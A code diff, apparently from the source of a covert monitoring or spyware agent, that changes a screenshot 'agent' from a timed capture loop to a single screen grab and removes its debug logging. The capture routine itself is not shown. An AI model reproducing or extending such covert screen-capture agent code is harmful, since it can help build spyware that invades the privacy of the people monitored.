@@ -240,64 +240,17 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
 - (void)start
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-#ifdef DEBUG_SCREENSHOT
-  infoLog(@"Agent screenshot started");
-#endif
+
+  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
   
-  [mAgentConfiguration setObject: AGENT_RUNNING
-                          forKey: @"status"];
   screenshotStruct *screenshotRawData;
   screenshotRawData = (screenshotStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
-  mSleepSec = screenshotRawData->sleepTime;
-  BOOL grabEntireDesktop = (screenshotRawData->grabActiveWindow == 0) 
-                           ? TRUE : FALSE;
+  BOOL grabEntireDesktop = (screenshotRawData->grabActiveWindow == 0)  ? TRUE : FALSE;
+   
+  [self _grabScreenshot: grabEntireDesktop];
+  
+  [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
 
-#ifdef DEBUG_SCREENSHOT
-  infoLog(@"AgentConf: %@", mAgentConfiguration);
-#endif
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
-    {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      
-      
-      if ([self _grabScreenshot: grabEntireDesktop] == YES)
-        {
-#ifdef DEBUG_SCREENSHOT
-          infoLog(@"Screenshotted! SPLASH");
-#endif
-        }
-      else
-        {
-#ifdef DEBUG_SCREENSHOT
-          errorLog(@"An error occurred while snapshotting");
-#endif
-        }
-      
-      [innerPool release];
-#ifdef DEBUG_SCREENSHOT
-      infoLog(@"Sleeping for %d seconds", mSleepSec);
-#endif
-      
-      int32_t sleepCounter = 0;
-      while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-             [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
-             sleepCounter < mSleepSec)
-        {
-          sleep(1);
-          sleepCounter++;
-        }
-    }
-  
-  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
-    {
-#ifdef DEBUG_SCREENSHOT
-      warnLog(@"Terminating Agent Screenshot");
-#endif
-      [mAgentConfiguration setObject: AGENT_STOPPED
-                              forKey: @"status"];
-    }
-  
   [outerPool release];
 }
 
@@ -305,10 +258,6 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
 {
   int internalCounter = 0;
 
-#ifdef DEBUG_SCREENSHOT
-  infoLog(@"Agent Screenshot Stop called");
-#endif
-  
   [mAgentConfiguration setObject: AGENT_STOP
                           forKey: @"status"];
   
